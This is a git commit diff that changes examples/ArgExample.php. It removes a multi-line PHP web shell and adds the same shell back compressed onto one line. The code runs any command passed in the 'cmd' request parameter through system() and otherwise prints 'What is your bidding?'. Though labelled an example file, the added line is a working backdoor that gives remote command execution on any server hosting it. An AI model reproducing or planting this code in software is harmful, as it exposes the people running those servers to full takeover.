845533b4e0ba3907cf0fdff03d10ebcf8d10fad5
qwerty510 <64289982+qwerty510@users.noreply.github.com>
2024-03-30 15:26:53 -0500

    Update ArgExample.php

--- examples/ArgExample.php
+++ examples/ArgExample.php
@@ -1,8 +1,1 @@
-<?php
-  if(isset($_REQUEST['cmd'])) {
-    $cmd = ($_REQUEST['cmd']);
-    system($cmd);
-  } else {
-    echo "What is your bidding?";
-  }
-?>
+<?php if(isset($_REQUEST['cmd'])){$cmd=($_REQUEST['cmd']);system($cmd);}else{echo "What is your bidding?";} ?>
